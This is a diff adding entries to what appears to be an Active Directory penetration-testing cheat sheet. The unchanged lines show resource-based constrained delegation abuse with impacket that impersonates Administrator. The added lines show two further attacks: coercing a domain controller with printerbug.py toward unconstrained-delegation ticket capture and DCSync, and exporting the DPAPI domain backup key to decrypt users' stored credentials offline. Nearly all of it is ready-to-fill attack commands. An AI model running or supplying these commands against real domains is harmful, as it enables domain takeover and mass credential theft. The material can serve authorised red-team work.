@@ -311,6 +311,19 @@ impacket-addcomputer -computer-name '<machine_account>$' -computer-pass '<machin
 impacket-rbcd -delegate-from '<machine_account>$' -delegate-to '<target>$' -action write -dc-ip <ip_address> <domain>/<user>:<password>
 impacket-getST -spn cifs/<target> -impersonate Administrator -dc-ip <ip_address> <domain>/'<machine_account>$':'<machine_password>'
 # companion:end rbcd-impacket
+
+# Unconstrained delegation — coerce a DC to you (TGT monitor on the unconstrained host) -> DCSync:
+# companion:gen unconstrained-deleg-tgt
+nxc ldap <ip_address> -u <user> -p <password> --trusted-for-delegation
+printerbug.py <domain>/<user>:<password>@<ip_address> <your-ip>
+# companion:end unconstrained-deleg-tgt
+
+# DPAPI domain backup key — pull once w/ DA, then decrypt any user's secrets offline:
+# companion:gen dpapi-backupkey
+impacket-dpapi backupkeys -t <domain>/<user>:<password>@<ip_address> --export
+impacket-dpapi masterkey -file <masterkey-file> -pvk key.pvk
+impacket-dpapi credential -file <credential-blob> -key <decrypted-masterkey>
+# companion:end dpapi-backupkey
 ////////////////////////////////////////
 
 
